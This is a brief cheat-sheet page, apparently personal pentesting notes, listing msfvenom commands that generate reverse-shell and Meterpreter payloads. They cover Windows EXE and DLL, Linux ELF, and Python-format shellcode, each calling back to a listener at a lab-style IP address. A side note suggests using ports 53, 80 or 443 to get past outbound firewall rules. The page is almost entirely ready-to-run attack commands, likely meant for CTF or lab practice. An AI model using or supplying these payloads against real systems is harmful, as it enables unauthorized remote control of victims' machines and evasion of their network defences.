---
title: "Metasploit Shellcode"
date: 2024-6-26
tags: ["metasploit", "shellcode", "revshell", "msfconsole", "msfvenom"]
---

---
### Generate Metasploit Shellcode

#### Windows x64 EXE

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 > rev.exe
```

#### Windows x86 EXE

```bash
# Staged
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 > rev.exe
```

```bash
# Stageless
msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread > rev.exe
```

#### Windows x64 DLL

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 > rev.dll
```

<small>*Note: These will be flagged by AV*</small>
<br>
<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

#### Linux amd64 ELF

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f elf > rev.elf
```

#### Others

```bash
# Generate shellcode in python format and avoid specific bytes
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f python -v shellcode --platform windows -b'\x00\x0a\0d' LHOST=10.10.14.10 LPORT=443
```

<br>